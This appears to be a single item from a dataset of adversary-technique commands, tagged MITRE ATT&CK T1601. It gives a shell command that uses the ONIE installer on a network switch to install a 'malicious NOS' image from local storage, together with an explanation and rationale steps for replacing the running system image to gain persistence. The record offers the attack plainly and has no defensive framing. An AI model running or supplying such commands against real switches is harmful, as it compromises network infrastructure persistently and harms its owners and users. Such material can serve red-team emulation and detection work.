command: echo 'T1601 patch: install malicious NOS via ONIE'; onie-nos-install -y /mnt/images/malicious-nos-installer.bin
explanation: Uses ONIE tooling available on many switches to install a malicious NOS image from local storage, replacing the running system image.
rationale_steps: Leverage ONIE’s installer from the Linux shell on an ONIE-enabled switch.
Provide a local malicious installer image to avoid network fetch.
Trigger a NOS replacement to persist the altered system image.
